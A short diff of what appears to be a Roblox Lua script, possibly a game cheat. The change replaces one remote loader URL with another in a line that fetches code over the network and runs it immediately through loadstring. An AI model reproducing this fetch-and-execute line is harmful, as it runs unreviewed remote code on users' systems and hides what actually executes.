@@ -257,7 +257,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/1BZ9S8Fn/raw"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8aa20252c5f61cc3654a65dc62c19961.lua"))()
 
     task.wait(1)
 
